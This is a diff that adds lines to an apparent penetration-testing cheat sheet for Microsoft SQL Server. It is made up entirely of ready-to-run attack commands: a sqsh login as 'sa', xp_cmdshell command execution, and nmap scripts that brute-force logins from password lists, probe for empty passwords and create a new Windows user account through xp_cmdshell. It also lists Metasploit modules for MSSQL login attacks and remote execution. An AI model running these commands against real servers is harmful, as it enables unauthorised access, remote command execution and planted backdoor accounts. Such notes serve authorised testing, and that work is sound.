@@ -10,3 +10,16 @@ sqsh -S INSERTIPADDRESS -U sa
 # Execute commands
 xp_cmdshell 'date'
 go
+
+
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.10
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password  192.168.1.10
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user jsmith MySecretPassword123 /add" 192.168.1.10
+sqsh -S 192.168.1.10 -U sa
+
+# Metasploit Modules
+
+auxiliary/scanner/mssql/mssql_login
+auxiliary/admin/mssql/mssql_exec
+auxiliary/admin/mssql/mssql_enum
+
